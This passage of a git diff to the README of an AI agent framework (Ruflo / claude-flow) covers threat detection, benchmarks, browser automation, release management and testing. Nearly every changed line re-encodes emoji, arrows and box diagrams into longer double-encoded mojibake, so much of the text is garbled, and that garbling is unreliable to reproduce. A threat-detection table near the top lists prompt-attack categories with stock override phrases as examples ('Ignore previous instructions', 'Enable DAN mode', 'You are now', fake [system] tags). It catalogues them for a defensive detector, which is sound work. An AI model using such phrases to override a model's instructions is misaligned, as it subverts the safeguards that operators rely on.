-| **Social Engineering** | Ã°Å¸Å¸Â¢ Low-Med | 2+ | Framing analysis | Hypothetical scenarios |
-| **Prompt Injection** | Ã°Å¸â€Â´ Critical | 10+ | Combined analysis | Mixed attack vectors |
+| **Instruction Override** | ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â´ Critical | 4+ | Keyword + context | "Ignore previous instructions" |
+| **Jailbreak** | ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â´ Critical | 6+ | Multi-pattern | "Enable DAN mode", "bypass restrictions" |
+| **Role Switching** | ÃƒÂ°Ã…Â¸Ã…Â¸Ã‚Â  High | 3+ | Identity analysis | "You are now", "Act as" |
+| **Context Manipulation** | ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â´ Critical | 6+ | Delimiter detection | Fake `[system]` tags, code blocks |
+| **Encoding Attacks** | ÃƒÂ°Ã…Â¸Ã…Â¸Ã‚Â¡ Medium | 2+ | Obfuscation scan | Base64, ROT13, hex payloads |
+| **Social Engineering** | ÃƒÂ°Ã…Â¸Ã…Â¸Ã‚Â¢ Low-Med | 2+ | Framing analysis | Hypothetical scenarios |
+| **Prompt Injection** | ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ‚Â´ Critical | 10+ | Combined analysis | Mixed attack vectors |
 
 ### Performance
 
@@ -6098,11 +6098,11 @@ npx ruflo@latest security scan --depth full
 ### Self-Learning Pipeline
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â    Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â    Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â    Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š   RETRIEVE  Ã¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š    JUDGE    Ã¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š   DISTILL   Ã¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š CONSOLIDATE Ã¢â€â€š
-Ã¢â€â€š   (HNSW)    Ã¢â€â€š    Ã¢â€â€š  (Verdict)  Ã¢â€â€š    Ã¢â€â€š   (LoRA)    Ã¢â€â€š    Ã¢â€â€š   (EWC++)   Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
-       Ã¢â€â€š                  Ã¢â€â€š                  Ã¢â€â€š                  Ã¢â€â€š
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â    ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â    ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â    ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   RETRIEVE  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    JUDGE    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   DISTILL   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ CONSOLIDATE ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   (HNSW)    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  (Verdict)  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   (LoRA)    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   (EWC++)   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
+       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
  Fetch similar     Rate success/      Extract key        Prevent
  threat patterns   failure            learnings          forgetting
 ```
@@ -6189,12 +6189,12 @@ const consensus = calculateSecurityConsensus(assessments);
 
 ---
 
-## Ã°Å¸Ââ€”Ã¯Â¸Â Architecture & Modules
+## ÃƒÂ°Ã…Â¸Ã‚ÂÃ¢â‚¬â€ÃƒÂ¯Ã‚Â¸Ã‚Â Architecture & Modules
 
 Domain-driven design, performance benchmarks, and testing framework.
 
 <details>
-<summary>Ã°Å¸Ââ€”Ã¯Â¸Â <strong>Architecture</strong> Ã¢â‚¬â€ DDD Modules, Topology Benchmarks & Metrics</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂÃ¢â‚¬â€ÃƒÂ¯Ã‚Â¸Ã‚Â <strong>Architecture</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â DDD Modules, Topology Benchmarks & Metrics</summary>
 
 Domain-Driven Design with bounded contexts, clean architecture, and measured performance across all topologies.
 
@@ -6222,7 +6222,7 @@ Domain-Driven Design with bounded contexts, clean architecture, and measured per
 | **Dependency Injection** | Constructor-based DI | Testable, mockable components |
 | **Event Sourcing** | All state changes as events | Full audit trail, replay capability |
 | **CQRS** | Separate read/write paths | Optimized queries, scalable writes |
-| **Clean Architecture** | Domain Ã¢â€ â€™ Application Ã¢â€ â€™ Infrastructure | Business logic isolation |
+| **Clean Architecture** | Domain ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Application ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ Infrastructure | Business logic isolation |
 
 ### Performance Benchmarks
 
@@ -6230,18 +6230,18 @@ Domain-Driven Design with bounded contexts, clean architecture, and measured per
 
 | Category | Metric | Target | Status |
 |----------|--------|--------|--------|
-| **Startup** | CLI cold start | <500ms | Ã¢Å“â€¦ Met |
-| **Startup** | MCP server init | <400ms | Ã¢Å“â€¦ Met |
-| **Memory** | HNSW search | <1ms | Ã¢Å“â€¦ Sub-ms |
-| **Memory** | Pattern retrieval | <10ms | Ã¢Å“â€¦ Met |
-| **Swarm** | Agent spawn | <200ms | Ã¢Å“â€¦ Met |
-| **Swarm** | Consensus latency | <100ms | Ã¢Å“â€¦ Met |
-| **Neural** | SONA adaptation | <0.05ms | Ã¢Å¡Â¡ Benchmarked |
-| **Graph** | Build (1k nodes) | <200ms | Ã¢Å“â€¦ Met |
-| **Graph** | PageRank (1k nodes) | <100ms | Ã¢Å“â€¦ Met |
-| **Learning** | Insight recording | <5ms | Ã¢Å“â€¦ Met |
-| **Learning** | Consolidation | <500ms | Ã¢Å“â€¦ Met |
-| **Task** | Success rate | 95%+ | Ã¢Å“â€¦ Met |
+| **Startup** | CLI cold start | <500ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
+| **Startup** | MCP server init | <400ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
+| **Memory** | HNSW search | <1ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Sub-ms |
+| **Memory** | Pattern retrieval | <10ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
+| **Swarm** | Agent spawn | <200ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
+| **Swarm** | Consensus latency | <100ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
+| **Neural** | SONA adaptation | <0.05ms | ÃƒÂ¢Ã…Â¡Ã‚Â¡ Benchmarked |
+| **Graph** | Build (1k nodes) | <200ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
+| **Graph** | PageRank (1k nodes) | <100ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
+| **Learning** | Insight recording | <5ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
+| **Learning** | Consolidation | <500ms | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
+| **Task** | Success rate | 95%+ | ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Met |
 
 ### Topology Performance
 
@@ -6259,7 +6259,7 @@ Domain-Driven Design with bounded contexts, clean architecture, and measured per
 ---
 
 <details>
-<summary><strong>Ã°Å¸Å’Â Browser Automation Ã¢â‚¬â€ @claude-flow/browser</strong></summary>
+<summary><strong>ÃƒÂ°Ã…Â¸Ã…â€™Ã‚Â Browser Automation ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â @claude-flow/browser</strong></summary>
 
 [![npm version](https://img.shields.io/npm/v/@claude-flow/browser?color=blue&label=npm)](https://www.npmjs.com/package/@claude-flow/browser)
 
@@ -6339,14 +6339,14 @@ const template = getWorkflow('login-basic');
 // { steps: [{action: 'open'}, {action: 'fill'}, ...], variables: [...] }
 ```
 
-Ã°Å¸â€œâ€“ [Full Documentation](./v3/@claude-flow/browser/README.md)
+ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã¢â‚¬â€œ [Full Documentation](./v3/@claude-flow/browser/README.md)
 
 </details>
 
 ---
 
 <details>
-<summary>Ã°Å¸â€œÂ¦ <strong>Release Management</strong> Ã¢â‚¬â€ @claude-flow/deployment</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã‚Â¦ <strong>Release Management</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â @claude-flow/deployment</summary>
 
 Automated release management, versioning, and CI/CD for Ruflo packages.
 
@@ -6390,16 +6390,16 @@ import { ReleaseManager } from '@claude-flow/deployment';
 
 const manager = new ReleaseManager();
 
-// Bump patch: 1.0.0 Ã¢â€ â€™ 1.0.1
+// Bump patch: 1.0.0 ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ 1.0.1
 await manager.prepareRelease({ bumpType: 'patch' });
 
-// Bump minor: 1.0.0 Ã¢â€ â€™ 1.1.0
+// Bump minor: 1.0.0 ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ 1.1.0
 await manager.prepareRelease({ bumpType: 'minor' });
 
-// Bump major: 1.0.0 Ã¢â€ â€™ 2.0.0
+// Bump major: 1.0.0 ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ 2.0.0
 await manager.prepareRelease({ bumpType: 'major' });
 
-// Prerelease: 1.0.0 Ã¢â€ â€™ 1.0.0-alpha.1
+// Prerelease: 1.0.0 ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ 1.0.0-alpha.1
 await manager.prepareRelease({ bumpType: 'prerelease', channel: 'alpha' });
 ```
 
@@ -6485,7 +6485,7 @@ npx @claude-flow/deployment release --version 2.0.0 --dry-run
 ---
 
 <details>
-<summary>Ã°Å¸â€œÅ  <strong>Performance Benchmarking</strong> Ã¢â‚¬â€ @claude-flow/performance</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬Å“Ã…Â  <strong>Performance Benchmarking</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â @claude-flow/performance</summary>
 
 Statistical benchmarking, memory tracking, regression detection, and V3 performance target validation.
 
@@ -6514,7 +6514,7 @@ console.log(`Mean: ${result.mean}ms, P99: ${result.p99}ms`);
 
 // Check against V3 target
 if (result.mean <= V3_PERFORMANCE_TARGETS['vector-search']) {
-  console.log('Ã¢Å“â€¦ Target met!');
+  console.log('ÃƒÂ¢Ã…â€œÃ¢â‚¬Â¦ Target met!');
 }
 ```
 
@@ -6640,7 +6640,7 @@ interface BenchmarkResult {
 import { formatBytes, formatTime } from '@claude-flow/performance';
 
 formatTime(0.00005);  // '50.00 ns'
-formatTime(0.5);      // '500.00 Ã‚Âµs'
+formatTime(0.5);      // '500.00 Ãƒâ€šÃ‚Âµs'
 formatTime(5);        // '5.00 ms'
 formatTime(5000);     // '5.00 s'
 
@@ -6673,23 +6673,23 @@ npx ruflo@latest performance benchmark --suite memory
 ---
 
 <details>
-<summary>Ã°Å¸Â§Âª <strong>Testing Framework</strong> Ã¢â‚¬â€ @claude-flow/testing</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Âª <strong>Testing Framework</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â @claude-flow/testing</summary>
 
 Comprehensive TDD framework implementing **London School** patterns with behavior verification, shared fixtures, and mock services.
 
 ### Philosophy: London School TDD
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š                  LONDON SCHOOL TDD                           Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š  1. ARRANGE - Set up mocks BEFORE acting                     Ã¢â€â€š
-Ã¢â€â€š  2. ACT     - Execute the behavior under test                Ã¢â€â€š
-Ã¢â€â€š  3. ASSERT  - Verify behavior (interactions), not state      Ã¢â€â€š
-Ã¢â€â€š                                                              Ã¢â€â€š
-Ã¢â€â€š  "Test behavior, not implementation"                         Ã¢â€â€š
-Ã¢â€â€š  "Mock external dependencies, test interactions"             Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
